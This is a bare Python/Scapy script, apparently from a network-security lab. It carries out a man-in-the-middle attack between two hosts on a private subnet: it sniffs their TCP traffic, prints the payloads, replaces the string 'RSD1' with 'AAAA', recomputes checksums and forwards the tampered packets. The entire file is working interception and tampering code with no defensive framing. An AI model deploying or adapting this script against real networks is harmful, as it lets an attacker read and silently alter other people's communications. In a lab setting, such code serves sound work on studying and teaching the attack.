#!/usr/bin/python3
from scapy.all import *
# Define IP addresses and MAC addresses
VM_A_IP = "10.0.2.5"  # Host A's IP
VM_B_IP = "10.0.2.6"  # Host B's IP
VM_A_MAC = "08:00:27:80:28:bc"
VM_B_MAC = "08:00:27:05:41:63"
VM_M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC
#problem with numbers until now...
def forwarding_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[Ether].dst == VM_M_MAC:
        newpkt = pkt[IP]
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            old_payload = pkt[TCP].payload.load
            print(old_payload)
            if(b'RSD1' in old_payload):
                print("detected")
                del(newpkt.chksum)  # Delete IP checksum (Scapy will recalculate it)
                del(newpkt[TCP].chksum)  # Delete TCP checksum (Scapy will recalculate it)
                del(newpkt[TCP].payload)
                newdata = old_payload.replace(b"RSD1", b"AAAA")
                newpkt = newpkt / newdata  # Attach the new payload and send the packet
        send(newpkt, verbose=False)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP and pkt[Ether].dst == VM_M_MAC:
        newpkt = pkt[IP]
        if pkt.haslayer(TCP) and pkt[TCP].payload:
            old_payload = pkt[TCP].payload.load
            print(old_payload)
            if(b'RSD1' in old_payload):
                print("detected")
                del(newpkt.chksum)  # Delete IP checksum (Scapy will recalculate it)
                del(newpkt[TCP].chksum)  # Delete TCP checksum (Scapy will recalculate it)
                del(newpkt[TCP].payload)
                newdata = old_payload.replace(b"RSD1", b"AAAA")
                newpkt = newpkt / newdata  # Attach the new payload and send the packet
        send(newpkt, verbose=False)
sniff(filter='tcp', prn=forwarding_pkt)
